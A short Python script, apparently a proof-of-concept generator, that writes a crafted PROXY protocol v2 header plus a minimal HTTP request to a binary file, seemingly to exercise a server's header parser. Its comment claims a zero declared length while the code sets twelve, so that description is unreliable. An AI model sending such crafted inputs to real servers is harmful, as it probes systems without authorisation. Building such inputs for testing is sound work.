from pathlib import Path
p=Path('/workspace/poc.bin')
# Craft a PROXY v2 header with a declared zero length and minimal trailing HTTP bytes.
# Signature is 12 bytes according to struct; parser checks first four bytes for CRLFCRLF before calling.
# We include the standard v2 signature prefix and then a compact header.
sig = b'\r\n\r\n\x00\r\nQUIT\n'
# cmd_ver=0x21 (PROXY), fam=0x11 (TCP4), len=12, then 12-byte IPv4 address/port block.
header = sig + bytes([0x21,0x11,0x00,0x0c]) + b'\x01\x02\x03\x04\x05\x06\x07\x08\x12\x34\x56\x78'
http = b'GET /proxy HTTP/1.0\r\nHost: x\r\n\r\n'
p.write_bytes(header + http)
print(len(header), len(http))
